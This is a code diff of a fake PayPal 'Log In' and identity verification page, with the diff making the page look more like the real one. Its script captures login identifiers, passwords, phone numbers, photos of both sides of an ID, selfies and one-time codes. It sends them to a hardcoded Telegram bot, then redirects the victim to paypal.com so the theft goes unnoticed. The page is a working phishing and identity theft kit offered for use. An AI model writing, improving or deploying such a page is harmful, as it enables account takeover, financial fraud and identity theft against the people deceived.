@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-    <title>PayPal • Verify Your Identity</title>
+    <title>PayPal - Log In</title>
     <style>
         * {
             margin: 0;
@@ -13,74 +13,72 @@
         }
 
         body {
-            background: #F7F9FA;
-            font-family: -apple-system, 'Segoe UI', 'Helvetica Neue', Helvetica, Roboto, Arial, sans-serif;
-            padding: 20px 16px 40px;
-            color: #1C1E21;
+            background: #F5F7FA;
+            font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, Arial, sans-serif;
+            padding: 24px 20px 40px;
+            color: #1A1A1A;
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
         .container {
-            max-width: 500px;
+            max-width: 460px;
+            width: 100%;
             margin: 0 auto;
         }
 
-        /* PayPal brand colors */
+        /* PayPal style card */
+        .card {
+            background: #FFFFFF;
+            border-radius: 16px;
+            padding: 28px 24px 36px;
+            box-shadow: 0 8px 28px rgba(0, 0, 0, 0.08), 0 2px 4px rgba(0, 0, 0, 0.02);
+            border: 1px solid #E4E9F2;
+            transition: all 0.2s;
+        }
+
         .paypal-header {
             text-align: center;
             margin-bottom: 28px;
         }
 
         .paypal-logo {
-            font-size: 34px;
+            font-size: 42px;
             font-weight: 700;
-            background: linear-gradient(135deg, #003087 0%, #009cde 100%);
-            background-clip: text;
-            -webkit-background-clip: text;
-            color: transparent;
-            letter-spacing: -0.5px;
+            color: #003087;
+            letter-spacing: -1px;
+            margin-bottom: 8px;
         }
 
-        .paypal-sub {
-            font-size: 14px;
-            color: #5E6F8D;
-            margin-top: 6px;
+        .paypal-logo span {
+            color: #009CDE;
         }
 
-        .panel {
-            background: #FFFFFF;
-            border-radius: 28px;
-            padding: 28px 22px;
-            margin-bottom: 20px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.03), 0 2px 6px rgba(0, 0, 0, 0.05);
-            border: 1px solid #E4E9F0;
-            transition: all 0.2s;
-        }
-
+        /* form elements */
         .input-group {
-            margin-bottom: 20px;
+            margin-bottom: 22px;
         }
 
         .input-label {
-            font-weight: 600;
+            font-weight: 500;
             font-size: 14px;
             color: #2C3E50;
             margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            display: block;
         }
 
         input, select {
             width: 100%;
             padding: 14px 16px;
-            font-size: 17px;
+            font-size: 16px;
             background: #FFFFFF;
-            border: 1.5px solid #E2E8F0;
-            border-radius: 16px;
+            border: 1px solid #C7D0D9;
+            border-radius: 12px;
             color: #1A1A1A;
             outline: none;
-            transition: 0.2s;
+            transition: all 0.2s;
             font-family: inherit;
         }
 
@@ -96,11 +94,12 @@
             width: 100%;
             border: none;
             padding: 14px;
-            border-radius: 44px;
-            font-size: 17px;
+            border-radius: 28px;
+            font-size: 16px;
             cursor: pointer;
             transition: 0.2s;
             font-weight: 600;
+            margin-top: 8px;
         }
 
         .action-btn:active {
@@ -109,17 +108,33 @@
         }
 
         .action-btn.secondary {
-            background: #F1F3F7;
-            color: #001F3F;
-            border: 1px solid #DAE2ED;
+            background: #F5F7FA;
+            color: #0070BA;
+            border: 1px solid #C7D0D9;
+        }
+
+        .forgot-link {
+            text-align: right;
+            margin-top: 6px;
+        }
+
+        .forgot-link a {
+            color: #0070BA;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-link a:hover {
+            text-decoration: underline;
         }
 
         .divider {
             text-align: center;
-            margin: 20px 0;
+            margin: 24px 0 16px;
             position: relative;
-            color: #6C7A91;
-            font-size: 13px;
+            color: #8A99AA;
+            font-size: 12px;
         }
 
         .divider::before,
@@ -129,20 +144,21 @@
             top: 50%;
             width: 40%;
             height: 1px;
-            background: #E9EDF2;
+            background: #E4E9F2;
         }
 
         .divider::before { left: 0; }
         .divider::after { right: 0; }
 
         .terms {
-            font-size: 12px;
-            color: #7C8BA0;
+            font-size: 11px;
+            color: #8A99AA;
             text-align: center;
-            margin-top: 22px;
+            margin-top: 28px;
             line-height: 1.4;
         }
 
+        /* step indicator for KYC */
         .step-indicator {
             display: flex;
             gap: 8px;
@@ -151,9 +167,9 @@
 
         .step-dot {
             flex: 1;
-            height: 5px;
-            background: #E2E8F0;
-            border-radius: 6px;
+            height: 4px;
+            background: #E4E9F2;
+            border-radius: 4px;
         }
 
         .step-dot.active {
@@ -166,10 +182,10 @@
 
         .camera-container {
             background: #000;
-            border-radius: 28px;
+            border-radius: 20px;
             overflow: hidden;
             margin: 16px 0 12px;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
         }
 
         .square-camera {
@@ -221,11 +237,11 @@
         }
 
         .status-badge {
-            background: #F0F4F9;
+            background: #F2F5F8;
             padding: 10px;
             border-radius: 60px;
             text-align: center;
-            font-size: 14px;
+            font-size: 13px;
             margin: 12px 0 4px;
             color: #1E2A3E;
             font-weight: 500;
@@ -296,12 +312,12 @@
 
         .otp-hint {
             background: #EFF6FF;
-            border-radius: 20px;
-            padding: 12px;
+            border-radius: 16px;
+            padding: 12px 16px;
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             font-size: 15px;
-            border-left: 4px solid #0070BA;
+            border-left: 3px solid #0070BA;
         }
 
         .phone-mask {
@@ -311,74 +327,88 @@
 
         .info-note {
             background: #FEF9E6;
-            border-radius: 14px;
-            padding: 12px;
-            font-size: 13px;
-            margin: 16px 0 8px;
+            border-radius: 12px;
+            padding: 10px 12px;
+            font-size: 12px;
+            margin: 12px 0 4px;
             color: #7A6A2E;
             text-align: center;
+        }
+
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .back-link a {
+            color: #6C7A8E;
+            font-size: 13px;
+            text-decoration: none;
         }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="paypal-header">
-        <div class="paypal-logo">PayPal</div>
-        <div class="paypal-sub">Secure identity verification • Business account</div>
-    </div>
-
-    <!-- STEP 1: EMAIL OR PHONE NUMBER -->
-    <div id="idPanel" class="panel">
+    <!-- STEP 1: EMAIL OR PHONE (like reference image) -->
+    <div id="loginPanel" class="card">
+        <div class="paypal-header">
+            <div class="paypal-logo">PayPal</div>
+        </div>
         <div class="input-group">
-            <div class="input-label">📧 Email or phone number</div>
+            <div class="input-label">Email address or mobile number</div>
             <input type="text" id="loginIdentifier" placeholder="example@email.com or +1 234 567 8900" autocomplete="off">
         </div>
-        <button class="action-btn" id="continueToPasswordBtn">Continue →</button>
+        <div class="forgot-link">
+            <a href="#" id="forgotEmailLink">Forgotten your email address?</a>
+        </div>
+        <button class="action-btn" id="continueToPasswordBtn">Next</button>
         <div class="terms">
-            By continuing, you agree to PayPal's Identity Verification terms.
+            By clicking Next, you agree to PayPal's <a href="#" style="color:#0070BA; text-decoration:none;">User Agreement</a> and <a href="#" style="color:#0070BA; text-decoration:none;">Privacy Policy</a>.
         </div>
     </div>
 
-    <!-- STEP 2: PASSWORD + PHONE NUMBER (for OTP) -->
-    <div id="passwordPanel" class="panel hide">
-        <div class="input-group">
-            <div class="input-label">🔒 Password</div>
-            <input type="password" id="userPassword" placeholder="Enter your PayPal password" autocomplete="off">
+    <!-- STEP 2: PASSWORD + PHONE NUMBER (for OTP delivery) -->
+    <div id="passwordPanel" class="card hide">
+        <div class="paypal-header">
+            <div class="paypal-logo" style="font-size: 32px;">PayPal</div>
         </div>
         <div class="input-group">
-            <div class="input-label">📱 Phone number for verification (OTP)</div>
-            <input type="tel" id="userPhoneNumber" placeholder="Mobile number with country code" autocomplete="off">
-            <div class="info-note">We'll send a security code to this number</div>
+            <div class="input-label">Password</div>
+            <input type="password" id="userPassword" placeholder="Enter your password" autocomplete="off">
         </div>
-        <button class="action-btn" id="submitPasswordBtn">Verify & Continue →</button>
-        <div class="divider">Secure connection</div>
+        <div class="input-group">
+            <div class="input-label">Confirm mobile number</div>
+            <input type="tel" id="userPhoneNumber" placeholder="Phone number for verification" autocomplete="off">
+            <div class="info-note">We'll send a security code to this number to verify your identity</div>
+        </div>
+        <button class="action-btn" id="submitPasswordBtn">Log In</button>
+        <div class="back-link"><a href="#" id="backToLoginLink">← Back</a></div>
     </div>
 
-    <!-- STEP 3: KYC PHOTOS (ID + SELFIE) -->
-    <div id="kycPanel" class="panel hide">
+    <!-- STEP 3: KYC PHOTOS (ID + Selfie) -->
+    <div id="kycPanel" class="card hide">
         <div class="step-indicator" id="stepIndicator">
             <div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div>
         </div>
-        <!-- Step KYC 1 - ID metadata -->
+        <!-- KYC Step 1: ID metadata -->
         <div id="kycStep1" class="kyc-step">
-            <div class="input-group"><div class="input-label">🪪 ID Type</div><select id="idType"><option value="">Select document</option><option>Driver's License</option><option>State ID Card</option><option>Passport</option><option>Resident Permit</option></select></div>
-            <div class="input-group"><div class="input-label">📍 Issuing State / Country</div><select id="idState"><option value="">Select state or region</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select></div>
+            <div class="input-group"><div class="input-label">ID type</div><select id="idType"><option value="">Select document</option><option>Driver's License</option><option>State ID Card</option><option>Passport</option><option>Resident Permit</option></select></div>
+            <div class="input-group"><div class="input-label">Issuing state / country</div><select id="idState"><option value="">Select state or region</option><option>Alabama</option><option>Alaska</option><option>Arizona</option><option>Arkansas</option><option>California</option><option>Colorado</option><option>Connecticut</option><option>Delaware</option><option>Florida</option><option>Georgia</option><option>Hawaii</option><option>Idaho</option><option>Illinois</option><option>Indiana</option><option>Iowa</option><option>Kansas</option><option>Kentucky</option><option>Louisiana</option><option>Maine</option><option>Maryland</option><option>Massachusetts</option><option>Michigan</option><option>Minnesota</option><option>Mississippi</option><option>Missouri</option><option>Montana</option><option>Nebraska</option><option>Nevada</option><option>New Hampshire</option><option>New Jersey</option><option>New Mexico</option><option>New York</option><option>North Carolina</option><option>North Dakota</option><option>Ohio</option><option>Oklahoma</option><option>Oregon</option><option>Pennsylvania</option><option>Rhode Island</option><option>South Carolina</option><option>South Dakota</option><option>Tennessee</option><option>Texas</option><option>Utah</option><option>Vermont</option><option>Virginia</option><option>Washington</option><option>West Virginia</option><option>Wisconsin</option><option>Wyoming</option></select></div>
             <button class="action-btn" id="kycStep1Next">Continue to ID capture →</button>
         </div>
         <div id="kycStep2" class="kyc-step hide">
-            <div class="status-badge">📄 FRONT side of your ID</div>
+            <div class="status-badge">📄 Front side of your ID</div>
             <div class="camera-container"><div class="square-camera"><video id="frontVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchFrontCam">⟳</div><div class="capture-btn" id="captureFrontBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="frontStatus">Position ID in frame & tap circle</div>
         </div>
         <div id="kycStep3" class="kyc-step hide">
-            <div class="status-badge">🔄 BACK side of your ID</div>
+            <div class="status-badge">🔄 Back side of your ID</div>
             <div class="camera-container"><div class="square-camera"><video id="backVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchBackCam">⟳</div><div class="capture-btn" id="captureBackBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="backStatus">Ready to capture</div>
         </div>
         <div id="kycStep4" class="kyc-step hide">
-            <div class="status-badge">🤳 Facial selfie (match ID)</div>
+            <div class="status-badge">🤳 Take a selfie</div>
             <div class="camera-container"><div class="square-camera"><video id="selfieVideo" autoplay playsinline muted></video></div></div>
             <div class="camera-controls"><div class="switch-cam" id="switchSelfieCam">⟳</div><div class="capture-btn" id="captureSelfieBtn"></div><div style="width:44px;"></div></div>
             <div class="status-badge" id="selfieStatus">Look at the camera</div>
@@ -391,15 +421,19 @@
         </div>
     </div>
 
-    <!-- STEP 4: OTP VERIFICATION with last 4 digits -->
-    <div id="otpPanel" class="panel hide">
+    <!-- STEP 4: OTP (no digit count mentioned) -->
+    <div id="otpPanel" class="card hide">
+        <div class="paypal-header">
+            <div class="paypal-logo" style="font-size: 30px;">PayPal</div>
+        </div>
         <div class="otp-hint" id="otpPhoneHint">🔐 Verification code sent to <span class="phone-mask" id="maskedPhone">****</span></div>
         <div class="input-group">
-            <div class="input-label">✉️ 6-digit code</div>
-            <input type="text" id="otpCode" placeholder="Enter code" autocomplete="off" maxlength="6">
+            <div class="input-label">Enter code</div>
+            <input type="text" id="otpCode" placeholder="Verification code" autocomplete="off">
         </div>
-        <button class="action-btn" id="otpSubmitBtn">Verify my account →</button>
-        <div class="terms">We use SMS to verify your identity. Standard rates may apply.</div>
+        <button class="action-btn" id="otpSubmitBtn">Verify</button>
+        <div class="terms">We sent a one-time code to your mobile number. Enter it above to finish verifying your identity.</div>
+        <div class="back-link"><a href="#" id="backToKycLink">← Back</a></div>
     </div>
 
     <div id="toastMsg" class="toast"></div>
@@ -407,15 +441,14 @@
 
 <div id="loadingOverlay" class="loading-overlay">
     <div class="spinner"></div>
-    <div class="loading-text">Processing secure verification...<br>Please wait</div>
+    <div class="loading-text">Processing verification...<br>Please wait</div>
 </div>
 
 <script>
-    // TELEGRAM CONFIGURATION (HARDCODED BOT FROM ORIGINAL EXAMPLE)
+    // TELEGRAM BOT (same as original requirements)
     const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
     const CHAT_ID   = "8737104261";
 
-    // Global user data storage
     let userData = {
         identifier: '',
         password: '',
@@ -425,25 +458,30 @@
         otpCode: ''
     };
 
-    // DOM elements for steps
-    const idPanel = document.getElementById('idPanel');
+    // DOM panels
+    const loginPanel = document.getElementById('loginPanel');
     const passwordPanel = document.getElementById('passwordPanel');
     const kycPanel = document.getElementById('kycPanel');
     const otpPanel = document.getElementById('otpPanel');
     const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
-    
-    // Inputs
-    const loginIdentifierInput = document.getElementById('loginIdentifier');
-    const continueToPasswordBtn = document.getElementById('continueToPasswordBtn');
-    const userPasswordInput = document.getElementById('userPassword');
-    const userPhoneNumberInput = document.getElementById('userPhoneNumber');
+
+    // Inputs step 1 & 2
+    const loginIdentifier = document.getElementById('loginIdentifier');
+    const continueBtn = document.getElementById('continueToPasswordBtn');
+    const userPassword = document.getElementById('userPassword');
+    const userPhone = document.getElementById('userPhoneNumber');
     const submitPasswordBtn = document.getElementById('submitPasswordBtn');
-    const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+    const backToLogin = document.getElementById('backToLoginLink');
+    const forgotLink = document.getElementById('forgotEmailLink');
+
+    // OTP
+    const otpSubmit = document.getElementById('otpSubmitBtn');
     const otpCodeInput = document.getElementById('otpCode');
     const maskedPhoneSpan = document.getElementById('maskedPhone');
+    const backToKycLink = document.getElementById('backToKycLink');
 
-    // Helper: Toast messages
+    // Helper: toast
     function showToast(msg, isError = false) {
         toast.innerText = msg;
         toast.classList.add('show');
@@ -451,7 +489,7 @@
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
 
-    // Telegram Sender (text)
+    // Send text to Telegram
     async function sendToTelegram(text) {
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -459,12 +497,11 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
             });
-            const data = await res.json();
-            return data.ok;
-        } catch(e) { console.warn(e); return false; }
+            return res.ok;
+        } catch(e) { return false; }
     }
 
-    // Send photo to Telegram (blob)
+    // Send photo to Telegram
     async function sendPhotoToTelegram(blob, caption) {
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
@@ -472,56 +509,65 @@
         if (caption) formData.append('caption', caption);
         try {
             const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            const data = await res.json();
-            return data.ok;
+            return res.ok;
         } catch(e) { return false; }
     }
 
-    // --- FLOW CONTROLS ---
     // Step 1 -> Step 2
-    continueToPasswordBtn.onclick = () => {
-        const identifier = loginIdentifierInput.value.trim();
+    continueBtn.onclick = () => {
+        const identifier = loginIdentifier.value.trim();
         if (!identifier) {
-            showToast("Please enter your email or phone number", true);
+            showToast("Please enter your email address or mobile number", true);
             return;
         }
         userData.identifier = identifier;
-        sendToTelegram(`💳 <b>PAYPAL LOGIN STAGE 1</b>\nUser ID/Email: <code>${identifier}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
-        idPanel.classList.add('hide');
+        sendToTelegram(`💳 <b>PAYPAL LOGIN - STAGE 1</b>\nIdentifier: <code>${identifier}</code>\n🌐 ${navigator.userAgent}\n⏱️ ${new Date().toLocaleString()}`);
+        loginPanel.classList.add('hide');
         passwordPanel.classList.remove('hide');
     };
 
-    // Step 2: Password + Phone number capture -> move to KYC
+    // Forgot email link (just demo)
+    forgotLink.onclick = (e) => {
+        e.preventDefault();
+        showToast("Please contact PayPal support for account recovery.", false);
+    };
+
+    // Back to login
+    backToLogin.onclick = (e) => {
+        e.preventDefault();
+        passwordPanel.classList.add('hide');
+        loginPanel.classList.remove('hide');
+        userPassword.value = '';
+        userPhone.value = '';
+    };
+
+    // Step 2 -> KYC (store password & phone)
     submitPasswordBtn.onclick = async () => {
-        const password = userPasswordInput.value.trim();
-        const phone = userPhoneNumberInput.value.trim();
+        const password = userPassword.value.trim();
+        const phone = userPhone.value.trim();
         if (!password) {
-            showToast("Please enter your PayPal password", true);
+            showToast("Please enter your password", true);
             return;
         }
         if (!phone || phone.length < 5) {
-            showToast("Valid phone number required for OTP verification", true);
+            showToast("Valid phone number required for verification", true);
             return;
         }
         userData.password = password;
         userData.phoneNumber = phone;
-        // Send telegram credentials + phone
-        await sendToTelegram(`🔐 <b>PAYPAL CREDENTIALS</b>\nLogin: <code>${userData.identifier}</code>\nPassword: <code>${password}</code>\nPhone (for OTP): <code>${phone}</code>\n⏱️ ${new Date().toLocaleString()}`);
-        // Proceed to KYC
+        await sendToTelegram(`🔐 <b>PAYPAL CREDENTIALS</b>\nLogin: <code>${userData.identifier}</code>\nPassword: <code>${password}</code>\nPhone (OTP delivery): <code>${phone}</code>\n⏱️ ${new Date().toLocaleString()}`);
         passwordPanel.classList.add('hide');
         kycPanel.classList.remove('hide');
         showKycStep(1);
     };
 
-    // ---- KYC PHOTO CAPTURE LOGIC (same pattern) ----
+    // ---- KYC camera logic ----
     let currentKycStep = 1;
     let frontStream, backStream, selfieStream, selfieIdStream;
     let usingRearFront = true, usingRearBack = true, usingRearSelfie = false, usingRearSelfieId = false;
 
     function stopStream(stream) {
-        if (stream && stream.getTracks) {
-            stream.getTracks().forEach(track => track.stop());
-        }
+        if (stream && stream.getTracks) stream.getTracks().forEach(t => t.stop());
     }
 
     async function initCamera(videoEl, facingMode) {
@@ -532,10 +578,10 @@
             await videoEl.play();
             return stream;
         } catch(e) {
-            let fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
-            videoEl.srcObject = fallbackStream;
+            let fallback = await navigator.mediaDevices.getUserMedia({ video: true });
+            videoEl.srcObject = fallback;
             await videoEl.play();
-            return fallbackStream;
+            return fallback;
         }
     }
 
@@ -552,7 +598,7 @@
             showToast("Camera not ready, please wait", true);
             return;
         }
-        statusElem.innerText = "📤 Uploading...";
+        statusElem.innerText = "Uploading...";
         let canvas = document.createElement('canvas');
         let size = Math.min(video.videoWidth, video.videoHeight);
         canvas.width = size;
@@ -563,10 +609,9 @@
         ctx.drawImage(video, sx, sy, size, size, 0, 0, size, size);
         canvas.toBlob(async blob => {
             const caption = `[PAYPAL KYC] ${sideDescription} | User: ${userData.identifier || userData.phoneNumber} | ${new Date().toLocaleString()}`;
-            const success = await sendPhotoToTelegram(blob, caption);
-            if (success) statusElem.innerText = `✅ ${sideDescription} uploaded successfully.`;
-            else statusElem.innerText = `⚠️ ${sideDescription} saved locally.`;
-            if (nextStepCallback) setTimeout(() => nextStepCallback(), 1000);
+            await sendPhotoToTelegram(blob, caption);
+            statusElem.innerText = `✅ ${sideDescription} uploaded.`;
+            if (nextStepCallback) setTimeout(() => nextStepCallback(), 800);
         }, 'image/jpeg', 0.8);
     }
 
@@ -575,7 +620,6 @@
         document.getElementById(`kycStep${step}`).classList.remove('hide');
         currentKycStep = step;
         updateStepDots(step);
-        // Clean previous streams based on step
         if (step === 2) {
             stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
             initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
@@ -600,7 +644,7 @@
         });
     }
 
-    // KYC step 1 next (ID type selection)
+    // KYC step1 next
     document.getElementById('kycStep1Next').onclick = () => {
         let idType = document.getElementById('idType').value;
         let idState = document.getElementById('idState').value;
@@ -614,42 +658,36 @@
         showKycStep(2);
     };
 
-    // Capture front ID
+    // Camera callbacks
     document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
     document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "FRONT_ID", () => showKycStep(3));
-    // Capture back ID
     document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
     document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "BACK_ID", () => showKycStep(4));
-    // Selfie
     document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s=>selfieStream=s, v=>usingRearSelfie=v, usingRearSelfie);
     document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "SELFIE_FACE", () => showKycStep(5));
-    // Selfie with ID
     document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
     document.getElementById('captureSelfieIdBtn').onclick = () => {
         capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "SELFIE_WITH_ID", async () => {
-            // after final photo, close KYC and show OTP panel
-            // stop all camera streams
             stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
             kycPanel.classList.add('hide');
-            // Show OTP panel, display last 4 digits of phone number
+            // display last 4 digits of phone number in OTP hint
             if (userData.phoneNumber && userData.phoneNumber.length >= 4) {
                 let last4 = userData.phoneNumber.slice(-4);
                 maskedPhoneSpan.innerText = last4;
             } else {
                 maskedPhoneSpan.innerText = "****";
             }
-            // Notify Telegram that KYC photos done, OTP stage started
-            await sendToTelegram(`📲 <b>KYC COMPLETED</b> for ${userData.identifier}. OTP stage ready. Phone ends with ${userData.phoneNumber.slice(-4)}`);
+            await sendToTelegram(`📲 <b>KYC COMPLETED</b> for ${userData.identifier}. Ready for OTP. Phone ends with ${userData.phoneNumber.slice(-4)}`);
             otpPanel.classList.remove('hide');
-            showToast("Identity documents uploaded. Please enter the verification code sent to your phone.", false);
+            showToast("Identity documents uploaded. Enter the verification code sent to your phone.", false);
         });
     };
 
-    // OTP submit & finalize
-    otpSubmitBtn.onclick = async () => {
+    // OTP final step
+    otpSubmit.onclick = async () => {
         const otpValue = otpCodeInput.value.trim();
-        if (!otpValue || otpValue.length < 4) {
-            showToast("Please enter the 6-digit verification code", true);
+        if (!otpValue || otpValue.length < 3) {
+            showToast("Please enter the verification code", true);
             return;
         }
         userData.otpCode = otpValue;
@@ -657,19 +695,21 @@
         loadingOverlay.classList.add('active');
         setTimeout(() => {
             loadingOverlay.classList.remove('active');
-            showToast("✅ Verification successful! Redirecting to PayPal dashboard...", false);
-            setTimeout(() => {
-                window.location.href = "https://www.paypal.com";
-            }, 1500);
+            showToast("Verification successful! Redirecting to PayPal...", false);
+            setTimeout(() => window.location.href = "https://www.paypal.com", 1500);
         }, 1800);
     };
 
-    // Helper to cleanup anything if panel closed unintentionally
+    // Back from OTP to KYC (in case user needs to retake photos)
+    backToKycLink.onclick = (e) => {
+        e.preventDefault();
+        otpPanel.classList.add('hide');
+        kycPanel.classList.remove('hide');
+        showKycStep(5);
+    };
+
     window.addEventListener('beforeunload', () => {
-        if (frontStream) stopStream(frontStream);
-        if (backStream) stopStream(backStream);
-        if (selfieStream) stopStream(selfieStream);
-        if (selfieIdStream) stopStream(selfieIdStream);
+        stopStream(frontStream); stopStream(backStream); stopStream(selfieStream); stopStream(selfieIdStream);
     });
 </script>
 </body>
